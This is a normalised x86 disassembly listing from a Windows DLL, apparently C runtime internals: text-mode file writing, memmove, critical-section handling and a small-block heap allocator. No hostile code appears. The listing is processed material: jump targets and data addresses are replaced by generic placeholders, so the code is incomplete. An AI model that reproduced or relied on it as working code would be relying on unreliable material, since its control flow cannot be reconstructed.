inc [ ebp - 0x60 ]
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov eax [ ebp + 0x528 ]
cmp [ ebp - 0x5c ] eax
jb r-xdata
inc esi
inc [ ebp - 0x5c ]
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp + 0x50c ]
push ecx
push 0x1
lea ecx [ ebp - 0x54 ]
push ecx
push eax
push [ ebp - 0x7c ]
inc esi
inc [ ebp - 0x5c ]
mov [ ebp - 0x74 ] esi
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x54 ] eax
call sub_1000c446
cmp ax [ ebp - 0x54 ]
pop ecx
jne r-xdata
mov esi [ ebp - 0x74 ]
jmp r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push esi
lea eax [ ebp + 0x50c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x60 ]
inc [ ebp - 0x68 ]
mov eax [ ebp - 0x50 ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
cmp [ ebp - 0x78 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push 0x1
lea eax [ ebp + 0x50c ]
push eax
mov eax [ edi ]
mov [ ebp + 0x50c ] 0xd
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x50 ] 0x1
jl r-xdata
inc [ ebp - 0x68 ]
inc [ ebp - 0x60 ]
jmp r-xdata
sub_10006cea
push 0x10
push r--data
call sub_10005acc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_100049de
and [ eax ] 0x0
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10005b11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000bec6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10006724
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10006dbc
mov eax [ ebp - 0x1c ]
sub_10006dd0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10006e58 ]
jmp [ ecx * 4 + jump_table_10006ed8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006f44 ]
pop esi
pop edi
pop ebp
jmp sub_1000c6b9
jmp [ ecx * 4 + jump_table_100070e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10006fe4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100070e0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10006f44 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100070e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006f44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006f44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10006f44 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100070e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100070e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100070e0 ]
sub_10007135
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_1000ba6d
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1000717e
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_100063a9
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_100071e8
push 0xc
push r--data
call sub_10005acc
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1000838c
push 0x1e
call sub_100081ec
push 0xff
call sub_10007f4e
push 0x18
call sub_10008468
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_100049cb
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10005b11
retn
push edi
call sub_100063a9
pop ecx
push 0xfa0
push edi
call sub_1000ba6d
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_100063a9
pop ecx
call sub_100049cb
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100072a2
mov eax [ ebp - 0x1c ]
sub_100072ab
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_100071e8
test eax eax
pop ecx
jne r-xdata
push 0x11
call sub_10007f04
pop ecx
sub_100072dc
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_10007324
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_1000734f
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_1000c7b0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_10007663
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10007713
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_10007819
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_10007af8
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
